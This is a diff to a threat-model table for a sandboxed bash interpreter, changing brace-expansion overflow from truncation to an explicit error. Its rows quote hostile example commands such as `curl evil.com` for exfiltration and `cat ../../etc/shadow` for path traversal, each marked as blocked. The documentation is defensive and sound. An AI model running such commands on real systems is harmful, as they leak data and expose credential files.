@@ -363,7 +363,7 @@ Heredocs with variable expansion are size-limited (10MB) but nested heredocs wit
 | 6 | dynamic import() escape | Hypothetical JS exec → `import('data:...')` → contextual loader hook | **BLOCKED when status is `level: "full"`; inspect lower levels otherwise** |
 | 7 | Network exfiltration | `curl evil.com` → network off → curl not registered | **BLOCKED** (network isolation) |
 | 8 | process.exit() | No bash→JS path. If bug: defense-in-depth → throw | **BLOCKED** (arch + secondary) |
-| 9 | Brace expansion OOM | `{1..999999999}` → maxBraceExpansionResults → truncated | **BLOCKED** (limits) |
+| 9 | Brace expansion OOM | `{1..999999999}` → maxBraceExpansionResults → explicit error | **BLOCKED** (limits) |
 | 10 | Python escape | Python off by default. If on: worker + defense + virtual FS | **RESIDUAL RISK** (opt-in) |
 | 11 | ReDoS via user regex | `[[ str =~ evil_pattern ]]` → re2js → linear-time match | **BLOCKED** (re2js) |
 | 12 | Path traversal | `cat ../../etc/shadow` → normalize → `isPathWithinRoot()` → ENOENT | **BLOCKED** (primary FS) |
